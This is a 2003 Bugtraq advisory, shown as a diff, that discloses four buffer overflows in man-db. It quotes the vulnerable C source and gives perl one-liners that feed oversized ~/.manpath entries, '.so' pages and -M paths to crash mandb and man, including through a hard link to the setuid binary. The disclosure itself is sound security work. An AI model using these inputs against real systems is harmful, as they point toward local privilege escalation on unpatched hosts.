@@ -1,0 +1,188 @@
+
+Date: 29 Jul 2003 21:03:08 -0000
+From: Vade 79 <v9@...ehalo.deadpig.org>
+To: bugtraq@...urityfocus.com
+Subject: man-db[] multiple(4) vulnerabilities.
+
+
+
+
+[part 1: add_to_dirlist() buffer overflow]
+
+man-db contains a buffer overflow vulnerability do to the lack of bounds
+checking in multiple sscanf() calls.  which formats the user supplied file 
+~/.manpath.  here is the function(src/manp.c):
+
+static void add_to_dirlist (FILE *config, int user)
+{
+	char *bp;
+	char buf[BUFSIZ];
+	char key[50], cont[512];
+	int c;
+
+	while ((bp = fgets (buf, BUFSIZ, config))) {
+
+		while (isspace (*bp))
+			bp++;
+
+		if (*bp == '#' || *bp == '\0')
+			continue;
+		else if (strncmp (bp, "NO", 2) == 0)
+			continue;
+		else if (sscanf (bp, "MANBIN %*s") == 1)
+			continue;
+		else if (sscanf (bp, "MANDATORY_MANPATH %s", key) == 1)
+			add_mandatory (key);	
+		else if (sscanf (bp, "MANPATH_MAP %s %s", key, cont) == 2) 
+			add_manpath_map (key, cont);
+	else if ((c = sscanf (bp, "MANDB_MAP %s %s", key, cont)) > 0) 
+			add_mandb_map (key, cont, c, user);
+		else if ((c = sscanf (bp, "DEFINE %50s %511[^\n]",
+				      key, cont)) > 0)
+			add_def (key, cont, c);
+		else if (sscanf (bp, "SECTION %511[^\n]", cont) == 1)
+			add_sections (cont);
+		else if (sscanf (bp, "SECTIONS %511[^\n]", cont) == 1)
+			/* Since I keep getting it wrong ... */
+			add_sections (cont);
+	 	else {
+		error (0, 0, _("can't parse directory list `%s'"), bp);
+			gripe_reading_mp_config (CONFIG_FILE);
+		}
+	}
+}
+
+as you can see; MANDATORY_MANPATH, MANPATH_MAP, and MANDB_MAP do not 
+properly limit the value written to key[50], and/or cont[512]).  however, 
+as far as exploitation by overflowing those buffers goes is limited.  this 
+is do to the way the buffers are allocated in memory, so when 
+overwritten, will just overwrite into another character buffer.
+
+but, this is not all in vain.  do to the size of buf[BUFSIZE], which is 
+8192 bytes(standard), and what key/cont overwrites into.  you can pass 
+enormously long values(~8192) to other functions.  as most checks are done 
+before-hand, and almost all buffers in the program are allocated to 4095 
+bytes; you can make the overflow occur, in many locations, elsewhere in 
+the program.
+
+proof/to test for vulnerability existence:
+(mandb will not make "x" when setuid, make it for it/bypass)
+# cd /tmp
+# mkdir x
+# echo MANDB_MAP `perl -e 'print"x"x8100'` x >~/.manpath
+# mandb
+Segmentation fault
+
+(can also apply this to the "man" binary, by fooling it with links)
+# cd /tmp
+# mkdir x
+# ln /usr/bin/man mandb
+# echo MANDB_MAP `perl -e 'print"x"x8100'` x >~/.manpath
+# ./mandb
+Segmentation fault
+
+versions found to have the vulnerability(current):
+2.4.1, 2.4.0, 2.3.20, 2.3.19, 2.3.18, ...?(far as i went back)
+
+
+
+[part 2: ult_src() buffer overflow]
+
+man-db contains a buffer overflow vulnerability do to the size of a buffer
+being half the size it should be(doesn't follow the 4096 trend), for a 
+"path".  another quote from the source(src/ult_src.c):
+
+char *ult_src (char *name, const char *path, struct stat *buf, int flags)
+{
+        static char basename[2048];     /* must be static */
+        static short recurse;           /* must be static */
+        static char *relative;          /* must be static */
+
+        /* initialise the function */
+
+        /* as ult_softlink() & ult_hardlink() do all of their respective
+         * resolving in one call, only need to sort them out once
+         */
+
+        if (recurse == 0) {
+                struct stat new_buf;
+                (void) strcpy (basename, name);
+
+...(other possibilities continue)
+}
+
+proof/to test for vulnerability existence:
+# man -M `perl -e 'print"/"x2100'`usr/share/man ls
+...(verbose)
+Segmentation fault
+
+versions found to have the vulnerability(current):
+2.4.1, 2.4.0, 2.3.20, 2.3.19, 2.3.18, ...?(far as i went back)
+
+
+
+[part 3: ".so" link buffer overflow]
+
+man-db contains a buffer overflow vulnerability do to the lack of bounds
+checking for ".so" link/redirection manpages.  this occurs when the 
+function attempts to change memory, without re-calculating the 
+size.  another source reference(src/ult_src.c):
+
+static __inline__ int test_for_include (char *buffer, char *rel)
+{
+        /* strip out any leading whitespace (if any) */
+        while (isspace ((int) *buffer))
+                buffer++;
+
+        /* see if the `command' is a .so */
+        if (strncmp (buffer, ".so", 3) == 0) {
+                buffer += 3;
+
+                /* strip out any whitespace between the command and
+                   it's argumant */
+                while (isspace ((int) *buffer))
+                        buffer++;
+
+                if (*buffer != '/') {
+                        /* copy filename into rel address */
+                        while (*buffer && !isspace ((int) *buffer))
+                                *(rel++) = *(buffer++);
+
+                        *rel = '\0';
+                        return 1;
+                }
+        }
+        return 0;
+}
+
+proof/to test for vulnerability existence:
+# cd /tmp
+# mkdir man man/man1
+# echo .so `perl -e 'print"x"x1024'` >man/man1/x.1
+# man -M /tmp/man x
+...(verbose)
+Segmentation fault
+
+versions found to have the vulnerability(current):
+2.4.1, 2.4.0, ...?(far as i went back)
+
+
+
+[part 4: PATH/MANPATH argument overflow]
+
+man-db contains a buffer overflow vulnerability do to the lack of bounds
+checking for the amount PATH/MANPATH values given.  the bug is found in 
+multiple routines.
+
+proof/to test for vulnerability existence:
+# man -M `perl -e 'print"/tmp:"x260'` x
+Segmentation fault
+
+versions found to have the vulnerability(current):
+2.4.1, 2.4.0, 2.3.20, 2.3.19, 2.3.18, ...?(far as i went back)
+
+
+
+Vade79 -> v9@...ehalo.deadpig.org -> fakehalo.
+
+
